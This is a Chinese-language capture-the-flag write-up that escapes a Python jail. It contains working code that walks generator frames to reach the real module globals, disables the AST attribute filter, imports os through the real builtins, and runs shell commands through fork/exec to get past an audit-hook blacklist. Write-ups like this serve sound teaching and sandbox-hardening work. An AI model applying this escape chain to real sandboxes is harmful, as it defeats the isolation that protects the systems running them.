# PyJail

## 题目简述

服务用 `ast.NodeVisitor` 禁止访问名字以双下划线开头的属性，并把 `__builtins__` 缩减为少量函数；随后安装 audit hook，阻止 `import`、`open`、`os.system` 和常见 `subprocess` 事件。每次输入最多 100 个字符，但多轮执行复用同一个 `sandbox_globals`。目标是借 Python 生成器的 `gi_frame` 与栈帧 `f_back` 取得沙箱外全局变量，关闭 AST 属性检查，再利用未封禁的底层 `os` 原语执行命令。

## 解题过程

### 从生成器回溯到真实 globals

AST visitor 只检查用户源码中形如 `obj.__attr__` 的静态属性名；`gi_frame`、`f_back` 和 `f_globals` 都不以下划线开头，因而可以直接出现。生成器表达式的 body 在迭代时才执行，此时变量 `a` 已经指向生成器自身：

```python
a = (a.gi_frame.f_back.f_back for _ in [1])
a = [x for x in a][0]
g = a.f_back.f_back.f_globals
```

通过 `gi_frame` 取得生成器帧，再沿 `f_back` 回到 `exec`、`safe_exec` 和模块帧，即可取得包含真实 `__builtins__`、`SandboxVisitor`、`sys` 等对象的模块全局字典。这一机制可参见 [Python 栈帧沙箱逃逸的背景说明](https://www.cnblogs.com/gaorenyusi/p/18242719)；其关键属性和本题使用的帧链已在这里完整展开。

### 关闭检查并取回模块

拿到模块 globals 后，可以改写 visitor 的处理函数，使下一轮输入不再检查属性：

```python
g["SandboxVisitor"].visit_Attribute = lambda self, node: None
real_builtins = g["__builtins__"]
os = real_builtins.__import__("os")
```

`import` 语句会产生被拦截的 audit event，但直接调用沙箱外真实 builtins 中的 `__import__` 可以取得 `os`。即使后续访问双下划线属性，visitor 也已被替换。

### 绕过 audit hook 执行命令

audit hook 只列举了 `os.system` 和常见 `subprocess` 调用，没有拦截 `os.pipe`、`os.fork`、`os.dup2`、`os.execlp`、`os.read` 与 `os.waitpid`。因此可以用这些低层原语自行实现带回显的命令执行：

```python
def run_command(cmd):
    read_fd, write_fd = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(read_fd)
        os.dup2(write_fd, 1)
        os.dup2(write_fd, 2)
        os.execlp("/bin/sh", "sh", "-c", cmd)

    os.close(write_fd)
    chunks = []
    while True:
        data = os.read(read_fd, 4096)
        if not data:
            break
        chunks.append(data)
    os.close(read_fd)
    os.waitpid(pid, 0)
    return b"".join(chunks).decode()
```

受 100 字符限制时，把上述函数源码编码成字符串，分多轮拼接，再调用真实 builtins 的 `exec`；多轮共享 `sandbox_globals`，所以中间变量不会丢失。

`start.sh` 说明真正的 flag 文件修改时间为 2025 年 5 月 1 日，其余同目录文件是不同日期的诱饵。先按时间查找，再用通配符避开目录名中的反斜杠转义字符：

```text
find / -type f -newermt '2025-05-01 00:00:00' ! -newermt '2025-05-02 00:00:00'
cat /tmp/.*/flagD
```

官方交互记录最终定位到 `/tmp/.\x0a\x0b\x00hidden/flagD` 并读出 flag。这里的 `\x0a` 等是目录名中的字面转义序列，不是文件名里的 NUL 字节；Linux 文件名本身不能包含 NUL。

## 方法总结

- 核心技巧：用生成器 `gi_frame` 和 `f_back` 逃逸到模块 globals，改写 AST visitor，再利用 audit hook 漏封的底层 `os` API 组合出命令执行。
- 识别信号：允许生成器表达式和普通 frame 属性、过滤只针对双下划线属性、沙箱 globals 跨轮持久化、audit hook 使用脆弱的事件黑名单。
- 复用要点：Python jail 不能只靠 AST 名称过滤或 audit event 黑名单；得到一个外层 frame 后，应立即检查 `f_globals`、真实 builtins、可变检查器对象和低层进程/文件描述符原语。长度限制通常可由持久变量和分段 `exec` 绕过。
